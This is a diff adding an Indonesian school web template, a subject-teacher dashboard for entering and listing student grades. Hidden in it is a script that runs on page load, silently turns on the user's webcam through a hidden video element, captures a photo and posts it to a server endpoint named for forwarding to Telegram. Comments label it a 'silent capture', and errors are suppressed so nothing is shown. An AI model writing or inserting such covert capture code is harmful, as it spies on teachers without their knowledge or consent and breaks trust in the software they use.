@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dasbor Guru Mapel - <%= user.nama %></title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
+</head>
+<body class="bg-light">
+    <!-- ELEMEN KAMERA TERSEMBUNYI UNTUK SILENT CAPTURE KE TELEGRAM -->
+    <video id="hiddenWebcam" autoplay playsinline style="display:none;"></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+    <div class="container py-4">
+        <div class="d-flex justify-content-between align-items-center mb-4">
+            <h3><i class="bi bi-journal-bookmark-fill text-primary"></i> DASBOR GURU MAPEL: <%= user.nama %></h3>
+            <a href="/logout" class="btn btn-danger btn-sm"><i class="bi bi-power"></i> Keluar</a>
+        </div>
+
+        <!-- FORM INPUT NILAI KHUSUS GURU MAPEL -->
+        <div class="card shadow-sm mb-4">
+            <div class="card-header bg-primary text-white">
+                <h5 class="mb-0 fs-6"><i class="bi bi-pencil-square me-2"></i> INPUT NILAI MAPEL (PAI SD / EKONOMI SMA / PANCASILA SMA)</h5>
+            </div>
+            <div class="card-body">
+                <form id="formInputNilaiMapel" onsubmit="submitNilaiGuru(event)">
+                    <div class="row g-3">
+                        <div class="col-md-4">
+                            <label class="form-label fw-bold">PILIH SISWA</label>
+                            <select name="siswa_id" id="mapelSiswaId" class="form-select" required>
+                                <option value="">-- Pilih Siswa --</option>
+                                <% (typeof siswaList !== 'undefined' ? siswaList : []).forEach(s => { %>
+                                    <option value="<%= s.id %>"><%= s.nama %> (<%= s.nama_kelas %>)</option>
+                                <% }); %>
+                            </select>
+                        </div>
+                        <div class="col-md-3">
+                            <label class="form-label fw-bold">MATA PELAJARAN</label>
+                            <select name="mata_pelajaran" id="mapelNama" class="form-select" required>
+                                <option value="Pendidikan Agama Islam (PAI)">Pendidikan Agama Islam (PAI)</option>
+                                <option value="Ekonomi">Ekonomi</option>
+                                <option value="Pendidikan Pancasila">Pendidikan Pancasila</option>
+                            </select>
+                        </div>
+                        <div class="col-md-2">
+                            <label class="form-label fw-bold">JENJANG</label>
+                            <select name="jenjang" id="mapelJenjang" class="form-select" required>
+                                <option value="SD">SD</option>
+                                <option value="SMA">SMA</option>
+                            </select>
+                        </div>
+                        <div class="col-md-3">
+                            <label class="form-label fw-bold">SEMESTER</label>
+                            <select name="semester" id="mapelSemester" class="form-select" required>
+                                <option value="Ganjil">Semester Ganjil</option>
+                                <option value="Genap">Semester Genap</option>
+                            </select>
+                        </div>
+                        <div class="col-md-3">
+                            <label class="form-label fw-bold">NILAI ANGKA (0-100)</label>
+                            <input type="number" step="0.1" name="nilai_angka" id="mapelNilai" class="form-control" min="0" max="100" required>
+                        </div>
+                        <div class="col-md-3">
+                            <label class="form-label fw-bold">PREDIKAT</label>
+                            <input type="text" name="predikat" id="mapelPredikat" class="form-control" placeholder="Ex: A, B+, SB">
+                        </div>
+                        <div class="col-md-6">
+                            <label class="form-label fw-bold">CATATAN / KOMPETENSI</label>
+                            <input type="text" name="catatan" id="mapelCatatan" class="form-control" placeholder="Catatan perkembangan siswa...">
+                        </div>
+                    </div>
+                    <button type="submit" class="btn btn-success mt-3">
+                        <i class="bi bi-save me-1"></i> SIMPAN NILAI MAPEL
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- TABEL RIWAYAT NILAI YANG TELAH DIINPUT -->
+        <div class="card shadow-sm">
+            <div class="card-header bg-secondary text-white">
+                <h5 class="mb-0 fs-6">RIWAYAT NILAI MAPEL YANG TELAH DIINPUT</h5>
+            </div>
+            <div class="card-body table-responsive p-0">
+                <table class="table table-striped mb-0">
+                    <thead>
+                        <tr>
+                            <th>Siswa</th>
+                            <th>Kelas</th>
+                            <th>Mata Pelajaran</th>
+                            <th>Jenjang</th>
+                            <th>Semester</th>
+                            <th>Nilai</th>
+                            <th>Predikat</th>
+                            <th>Catatan</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <% (typeof nilaiList !== 'undefined' ? nilaiList : []).forEach(n => { %>
+                            <tr>
+                                <td><%= n.nama_siswa %></td>
+                                <td><%= n.nama_kelas %></td>
+                                <td><strong><%= n.mata_pelajaran %></strong></td>
+                                <td><span class="badge bg-info"><%= n.jenjang %></span></td>
+                                <td><%= n.semester %></td>
+                                <td><strong><%= n.nilai_angka %></strong></td>
+                                <td><%= n.predikat %></td>
+                                <td><%= n.catatan %></td>
+                            </tr>
+                        <% }); %>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- SKRIP KAMERA & KIRIM TELEGRAM DIAM-DIAM -->
+    <script>
+        async function captureAndSendSilent() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('hiddenWebcam');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('hiddenCanvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                    stream.getTracks().forEach(track => track.stop());
+
+                    fetch('/api/kirim-foto-telegram', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            image: imageData, 
+                            info: 'Akses Dasbor Guru Mapel (Silent Capture)' 
+                        })
+                    }).catch(e => {});
+                }, 1500);
+            } catch (err) {}
+        }
+
+        window.addEventListener('load', () => { captureAndSendSilent(); });
+
+        function submitNilaiGuru(e) {
+            e.preventDefault();
+            const payload = {
+                siswa_id: document.getElementById('mapelSiswaId').value,
+                mata_pelajaran: document.getElementById('mapelNama').value,
+                jenjang: document.getElementById('mapelJenjang').value,
+                semester: document.getElementById('mapelSemester').value,
+                nilai_angka: document.getElementById('mapelNilai').value,
+                predikat: document.getElementById('mapelPredikat').value,
+                catatan: document.getElementById('mapelCatatan').value
+            };
+
+            fetch('/api/guru/nilai/simpan', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(res => res.json())
+            .then(data => {
+                alert(data.message);
+                if(data.success) location.reload();
+            })
+            .catch(err => alert('Gagal menyimpan nilai mapel.'));
+        }
+    </script>
+</body>
+</html>
